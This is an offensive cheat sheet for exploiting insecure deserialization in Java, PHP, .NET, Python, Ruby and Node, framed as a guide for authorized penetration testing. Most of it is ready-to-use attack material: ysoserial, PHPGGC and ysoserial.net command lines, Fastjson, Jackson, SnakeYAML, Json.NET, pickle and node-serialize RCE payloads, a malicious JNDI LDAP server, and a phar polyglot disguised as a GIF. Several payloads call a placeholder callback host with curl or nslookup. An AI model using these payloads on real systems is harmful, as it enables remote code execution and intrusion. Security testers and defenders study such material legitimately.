# Insecure Deserialization Arsenal — Recognition · Payloads · Gadget Tools (per language)

> Companion to `DESERIALIZATION_TESTING_GUIDE.md`. Authorized testing only. Replace `YOUR-OOB` with your Collaborator/
> Interactsh host. **Confirm with a blind DNS gadget first**, prove RCE with **one benign command** (`id`/`nslookup`),
> then STOP. No shells/persistence; delete uploaded artifacts; tear down JNDI/LDAP/OOB servers.

---

## 1. Recognize the format (do this first — decides everything)
```
Java ObjectInputStream   hex: AC ED 00 05     b64: rO0AB…      gzip+b64: H4sI…
PHP serialize()          O:4:"User":2:{…}     a:2:{…}   s:3:"…";  b:1;  i:5;  (phar: "PK…"/"<?php __HALT_COMPILER")
.NET BinaryFormatter     hex: 00 01 00 00 00 FF FF FF FF   b64: AAEAAAD/////
.NET ViewState           __VIEWSTATE=/wEP…  (LosFormatter/ObjectStateFormatter)
Python pickle            \x80\x04… / \x80\x03…  (proto2 "(dp0")   b64: gAR…/gAN…
Python PyYAML (unsafe)   contains  !!python/object/apply:
Ruby Marshal             hex: 04 08           b64: BAh…
Node node-serialize      contains  _$$ND_FUNC$$_
Java JSON gadgets        Jackson @class / Fastjson "@type" / XStream <java.*> / SnakeYAML !!javax…
```
```bash
python3 poc/deser_detect.py 'rO0ABXNy...'          # fingerprint a blob (handles base64/gzip)
python3 poc/deser_detect.py --cookie "$COOKIE"
```

## 2. Confirm deserialization SAFELY (blind, no RCE)
```bash
# Java URLDNS — DNS lookup on deserialize, NO gadget dependency, NO code exec: the clean first proof
java -jar ysoserial.jar URLDNS "http://UNIQUE.YOUR-OOB" | base64 -w0
# drop that into the cookie/param → a DNS hit to YOUR-OOB confirms deserialization
```
Tamper test: flip one byte/field → a deserialization stack trace naming ObjectInputStream/unserialize/BinaryFormatter/pickle confirms the sink + language.

## 3. Java — ysoserial (classpath-dependent → probe then fire)
```bash
java -jar ysoserial.jar CommonsCollections5 'nslookup UNIQUE.YOUR-OOB' | base64 -w0
java -jar ysoserial.jar CommonsCollections6 'curl http://YOUR-OOB/j'   | base64 -w0
# other chains: CommonsCollections1-7, Spring1/2, Groovy1, Hibernate1, ROME, Clojure, C3P0, JRMPClient, CommonsBeanutils1
# GadgetProbe (Burp) first → learn which libraries are on the classpath → pick the matching chain (don't spray)
```
**Java JSON / YAML libs:**
```
Fastjson  {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://YOUR-OOB:1389/Exploit","autoCommit":true}
Jackson   ["org.springframework.context.support.ClassPathXmlApplicationContext","http://YOUR-OOB/spel.xml"]   (with default typing)
SnakeYAML !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://YOUR-OOB/"]]]]
XStream   <sorted-set><…dynamic-proxy gadget…></sorted-set>   (see marshalsec/PayloadsAllTheThings)
```
**JNDI server (Fastjson/Jackson/Log4Shell family):**
```bash
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://YOUR-OOB:8080/#Exploit" 1389   # serves the malicious class
```

## 4. PHP — object injection, PHPGGC, phar
```bash
# framework POP chains → the serialized string to inject into unserialize()
phpggc -l                                        # list: Laravel, Symfony, WordPress, Drupal, Monolog, Guzzle, Yii, CodeIgniter, …
phpggc Laravel/RCE1 system 'curl http://YOUR-OOB/p'
phpggc Monolog/RCE1 system id
phpggc Guzzle/RCE1 system id
```
```php
// manual object injection (auth bypass — flip a property, no gadget needed):
O:4:"User":2:{s:4:"name";s:5:"guest";s:7:"isAdmin";b:1;}   // b:0 -> b:1
// __wakeup bypass (old PHP CVE-2016-7124): wrong property COUNT skips __wakeup:
O:4:"User":3:{...}   // declare 3 props but supply 2
```
```bash
# PHAR deserialization — NO unserialize() call; any file-op on phar:// deserializes metadata
phpggc -p phar -o evil.phar -f Monolog/RCE1 system id     # build phar
#   disguise as image (polyglot) → upload → trigger file_exists/getimagesize/fopen('phar://evil.jpg/x')
#   GIF trick: prepend "GIF89a" so image validators pass:
phpggc -p phar --fast-destruct -pj 'GIF89a' -o evil.gif Monolog/RCE1 system 'curl http://YOUR-OOB/phar'
```

## 5. .NET — ysoserial.net & ViewState
```bash
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "nslookup UNIQUE.YOUR-OOB" -o base64
ysoserial.exe -f LosFormatter    -g TypeConfuseDelegate -c "cmd /c whoami" -o base64
# gadgets: TypeConfuseDelegate, ObjectDataProvider, WindowsIdentity, DataSet, PSObject, ActivitySurrogateSelector
```
```bash
# ViewState (the big one) — no MAC, or you hold the machineKey (leaked web.config via ../XXE//../LFI/):
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c nslookup UNIQUE.YOUR-OOB" \
  --path="/page.aspx" --apppath="/" --generator=<__VIEWSTATEGENERATOR> \
  --validationkey=<HEX_KEY> --validationalg=SHA1
# no MAC at all → drop the key args; unauthenticated ViewState RCE = Critical
```
```
Json.NET (TypeNameHandling != None):
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start",
 "ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c nslookup UNIQUE.YOUR-OOB"}}}
```

## 6. Python — pickle / PyYAML / jsonpickle
```bash
python3 poc/pickle_poc.py --cmd 'curl http://YOUR-OOB/py'     # prints base64 pickle (benign marker default)
```
```python
# pickle __reduce__ (RCE on pickle.loads):
class E:
    def __reduce__(self): return (__import__('os').system, ('nslookup UNIQUE.YOUR-OOB',))
# PyYAML (yaml.load unsafe loader):
!!python/object/apply:os.system ["id"]
!!python/object/apply:subprocess.check_output [["id"]]
# jsonpickle:
{"py/object":"__main__.X", "py/reduce":[{"py/function":"os.system"},["id"]]}
```
> ML model files (`.pkl`,`.pt`,`.joblib`,`.h5`) deserialize via pickle → RCE on load. Uploading/loading a model = a sink.

## 7. Ruby — Marshal / YAML
```ruby
# Rails YAML (CVE-2013-0156 family) / Marshal.load — universal gadget (stdlib-only) via public generator:
# base64 the Marshal payload into the sink; YAML variant uses !ruby/object tags.
Marshal.load(payload)   # sink;   YAML.load(params[:x])  # sink
```
Use the public universal-deserialization-gadget generator (Ruby 2.x/3.x) → RCE; confirm with a callback/`sleep`.

## 8. Node — node-serialize
```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://YOUR-OOB/n',function(){})}()"}
```
base64 → drop into the cookie/param the app passes to `unserialize()`. (Prototype-pollution gadgets often overlap.)

## 9. Tooling cheat
```
ysoserial (Java)        gadget chains for ObjectInputStream + URLDNS (blind confirm)
ysoserial.net (.NET)    BinaryFormatter/LosFormatter/ViewState/Json.NET gadgets
PHPGGC (PHP)            framework POP chains + phar builder (-p phar)
marshalsec (Java)       LDAP/RMI/JNDI servers for Fastjson/Jackson/SnakeYAML/Log4Shell
GadgetProbe (Burp)      fingerprint which Java gadget libraries are on the classpath
Freddy (Burp)           passive/active Java & .NET deserialization scanner
poc/ (this kit)         deser_detect.py · pickle_poc.py · php_object_poc.py · ysoserial_cheat.md
```
